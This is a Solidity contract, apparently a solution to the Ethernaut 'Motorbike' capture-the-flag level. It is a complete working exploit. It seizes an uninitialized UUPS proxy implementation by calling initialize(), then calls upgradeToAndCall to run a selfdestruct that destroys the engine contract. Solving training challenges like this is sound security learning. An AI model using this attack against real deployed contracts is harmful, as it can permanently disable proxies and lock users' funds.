// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "./ethernaut/Motorbike.sol";
import "hardhat/console.sol";

contract MotorbikeAttacker {

    function attack(address engineAddress) external {
        console.log("Attacking ", engineAddress);

        Engine engine = Engine(engineAddress);
        engine.initialize();
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.killEngine.selector)
        );
    }

    function killEngine() external {
        console.log("killEngine()");
        selfdestruct(address(0));
    }
}